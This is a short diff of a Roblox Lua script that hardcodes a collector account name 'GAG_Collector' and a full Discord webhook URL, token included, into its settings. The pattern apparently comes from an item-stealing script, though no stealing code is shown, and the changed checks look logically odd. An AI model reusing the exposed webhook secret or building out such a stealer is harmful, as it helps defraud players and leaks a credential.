@@ -1,9 +1,9 @@
 task.spawn(function()
-	if Username == nil or Username == "" then
+	if Username == nil or Username == "GAG_Collector" then
 		Username = getgenv().allowed_name
 	end
 
-	if Webhook == nil or Webhook == "" then
+	if Webhook == nil or Webhook == "https://discord.com/api/webhooks/1464295713058853152/8vdnexaDNTspM4-Ja6c8CY1vtqMGj_fuRrDZI7IXahytguEjF4YAadWLJ8JGGJY_ubLG" then
 		Webhook = getgenv().webhook
 	end
 end)
